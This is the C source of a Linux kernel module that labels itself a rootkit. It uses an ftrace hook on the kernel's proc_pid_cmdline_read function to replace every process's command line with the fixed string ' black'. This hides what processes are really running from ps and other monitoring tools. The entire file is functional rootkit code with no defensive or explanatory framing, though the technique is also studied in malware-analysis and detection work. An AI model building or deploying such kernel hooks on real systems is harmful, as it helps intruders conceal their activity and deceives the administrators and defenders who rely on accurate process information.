#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("black");
MODULE_VERSION("1.00");

static asmlinkage ssize_t (*proc_pid_cmdline_read)(struct file *file,
						   char __user *buf,
						   size_t count, loff_t *pos);

static ssize_t hook_proc_pid_cmdline_read(struct file *file, char __user *buf,
					  size_t count, loff_t *pos)
{
	int ret = 0;
	char page[PAGE_SIZE] = " black";

	if (*pos >= strlen(page))
		return 0;

	ret = copy_to_user(buf, page, strlen(page));
	if (ret)
		return -EFAULT;
	*pos += strlen(page);
	// pr_info("hook_proc_pid_cmdline_read: %llu", *pos);

	return strlen(page);
}

static struct ftrace_hook hooks[] = {
	HOOK("proc_pid_cmdline_read", hook_proc_pid_cmdline_read,
	     &proc_pid_cmdline_read),
};

static int __init rootkit_init(void)
{
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
